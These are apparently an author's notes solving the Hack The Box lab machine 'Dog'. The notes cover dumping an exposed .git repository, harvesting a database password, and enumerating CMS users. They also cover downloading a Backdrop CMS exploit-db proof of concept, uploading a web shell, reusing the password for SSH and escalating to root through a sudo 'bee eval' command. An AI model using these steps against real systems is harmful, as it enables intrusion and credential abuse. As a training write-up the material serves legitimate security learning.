#TODO
#HTB/WriteUp/Machine/Easy

nmap -sV -sC -A 10.129.77.72

found .git directory
and
robots.txt

http://10.129.77.72/?q=about
found domain dog.htb
echo '10.129.77.72 dog.htb'|sudo tee -a /etc/hosts

git clone https://github.com/lijiejie/GitHack.git && cd GitHack
python3 GitHack.py http://dog.htb/.git
settings.php
mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop

salt
aWFvPQNGZSz1DQ701dD4lC5v1hQW34NefHvyZUzlThQ

hmm, no git commit history, try another tool
githacker --url http://127.0.0.1/.git/ --output-folder result
commit:
todo: customize url aliases.  reference:https://docs.backdropcms.org/documentation/url-aliases
probably will find something interesting there
also note author
Author: root <dog@dog.htb>

lets find out backdrop version in git sources
grep -R version .
./core/themes/basis/basis.info:version = BACKDROP_VERSION
./core/themes/basis/basis.info:version = 1.27.1

searchsploit backdrop 
nothing interesting
lets google backdrop cve rce
found POC
https://www.exploit-db.com/exploits/52021
curl https://www.exploit-db.com/raw/52021 > poc.py

python poc.py http://dog.htb
well, payload is generated and now we need to gain admin creds, lets try default ones
we'll grep source codes
hmmm
./core/includes/password.inc:      $hash = _password_crypt('md5', $password, $stored_hash);

hash is md5?...
examine sources and google, asked deepseek and it seems there is no default password
lets try pass from mysql for user dog and root
didn't work :(

tried forgot password
dog@dog.htb
root@dog.htb
admin@dog.htb
it tells invalid email
tried 
dog
root
admin

and lets check blog posts authors
dogBackDropSystem
yep! unable send email
BackDropJ2024DS2024
but it didn't work either

python BackDropScan.py --url http://dog.htb --userslist /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt --userenum
log in to cms with found usernames at /?q=user/login
finally found working one:
tiffany@dog.htb:BackDropJ2024DS2024

python poc.py http://dog.htb
aunpack shell.zip
apack shell.tar.gz shellBackDropScan
http://dog.htb/?q=admin/installer/manual
upload shell.tar.gz

open shell
http://dog.htb/modules/shell/shell.php

list users
ls /home
johncusack

reuse the password:
ssh johncusack@dog.htb
BackDropJ2024DS2024

sudo -l
read /usr/local/bin/bee help and run
sudo /usr/local/bin/bee --root=/var/www/html/ eval "system(cat /root/root.txt');"